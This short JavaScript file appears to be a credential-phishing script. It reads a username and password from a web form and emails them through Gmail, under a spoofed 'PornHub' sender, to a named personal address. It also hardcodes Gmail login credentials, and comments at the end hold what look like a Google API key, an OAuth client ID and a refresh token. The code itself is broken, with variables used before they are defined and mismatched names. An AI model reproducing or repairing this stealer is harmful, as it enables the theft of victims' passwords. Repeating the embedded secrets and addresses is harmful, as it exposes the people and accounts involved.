const nodemailer = require('nodemailer');

var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: "jimmyneutron.its.4.20@gmail.com",
        pass: "LolThisIsMyPassword"
    }
})

const mailOptions = {
    from: 'PornHub <jimmyneutron.its.4.20@gmail.com>',
    to: 'HaydenSeward78@gmail.com',
    subject: 'Someones Password',
    text: UserName + " " + Password,
}

function onSubmit() {
    var Name = document.getElementById("UserName").value;
    var Password = document.getElementById("Password").value;
    window.alert("This Bot Was Made By Hayden Seward");
    transporter.sendMail(mailOptions, function (err, info) {
        if(err)
          console.log(err)
        else
          console.log(info);
     });
}
// AIzaSyBWLaR5eaygSx96U5Zk_Zd-6A2X_zV-hqU
// 854133446805-neaa0eifg6sapb8aqmkrk3eq0tsslng8.apps.googleusercontent.comn
// Refresh Token 1/UBHW-q_Yzd7ocDUpQd4DTA5GrX9u7V5pM9Pe8tJEG-U